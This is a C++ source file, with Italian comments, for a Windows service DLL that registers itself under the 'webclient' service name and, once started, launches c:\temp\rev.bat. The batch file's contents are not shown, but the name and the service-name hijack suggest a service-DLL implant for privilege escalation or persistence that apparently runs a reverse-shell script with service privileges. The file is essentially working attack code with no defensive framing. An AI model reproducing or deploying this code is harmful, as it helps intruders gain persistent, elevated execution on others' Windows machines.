// servicedll.cpp: definisce le funzioni esportate per l'applicazione DLL.
//

#include "stdafx.h"
#include <stdio.h>
#define EXPORT comment(linker, "/EXPORT:" __FUNCTION__ "=" __FUNCDNAME__)
__declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);
__declspec(dllexport) DWORD WINAPI MyHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);

SERVICE_STATUS_HANDLE   hServiceStatusHandle;
SERVICE_STATUS          ServiceStatus;
void Log(char *message);
void Log(char *message)
{
FILE *file;


file = fopen("c:/temp/log.txt", "a+");


fputs(message, file);
fclose(file);

}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	return TRUE;
}


VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
#pragma EXPORT
	
	
	Log("service  main\n");
	DWORD   status = 0;
	DWORD   specificError = 0xfffffff;

	ServiceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE;
	ServiceStatus.dwWin32ExitCode = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwCheckPoint = 0;
	ServiceStatus.dwWaitHint = 0;
	//SERVICE_STATUS_HANDLE hStatus 
		hServiceStatusHandle = RegisterServiceCtrlHandlerW(L"webclient", (LPHANDLER_FUNCTION)MyHandler);
	if (hServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)
	{
		// Registering Control Handler failed
		Log("Registering Control Handler failed\n");
		return;
	}
	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(hServiceStatusHandle, &ServiceStatus);

	// Initialize Service
	//startSvc();
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	if (!CreateProcess(L"c:\\temp\\rev.bat", NULL, NULL, NULL, 0, 0, NULL, NULL, &si, &pi))
		Log("proc failes\n");
	// Register the handler function for the service

	
}

DWORD WINAPI MyHandler(
	DWORD dwControl,
	DWORD dwEventType,
	LPVOID lpEventData,
	LPVOID lpContext
)
{
#pragma EXPORT
	Log("handler\n");

	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		Log("handler stop\n");
		ServiceStatus.dwWin32ExitCode = 0;
		ServiceStatus.dwCurrentState = SERVICE_STOPPED;
		ServiceStatus.dwCheckPoint = 0;
		ServiceStatus.dwWaitHint = 0;
		break;
	case SERVICE_CONTROL_PAUSE:
		ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		break;
	case SERVICE_CONTROL_CONTINUE:
		ServiceStatus.dwCurrentState = SERVICE_RUNNING;
		break;
	case SERVICE_CONTROL_INTERROGATE:
		break;
	default:
		break;
	};

	SetServiceStatus(hServiceStatusHandle, &ServiceStatus);

	return NO_ERROR;
}



